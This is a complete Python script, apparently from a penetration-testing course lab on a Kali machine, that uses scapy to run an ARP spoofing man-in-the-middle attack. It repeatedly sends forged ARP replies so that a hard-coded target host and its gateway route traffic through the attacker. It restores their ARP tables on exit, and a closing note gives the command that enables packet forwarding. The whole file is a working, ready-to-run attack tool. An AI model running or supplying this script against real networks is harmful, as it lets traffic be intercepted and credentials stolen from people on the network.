import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_req_brdcast = broadcast / arp_req

    answered_list = scapy.srp(arp_req_brdcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # op=2: send ARP response instead of ARP request (op=1)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)

    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
    pkt_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        pkt_count += 2
        print("\r[+] Packets sent: " + str(pkt_count), end="") # \r: move cursor to start of the line
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] resetting ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] quitting")
    

### NOTES ###
# We must enable the Kali machine to forward packets as a router:
# echo 1 > /proc/sys/net/ipv4/ip_forward
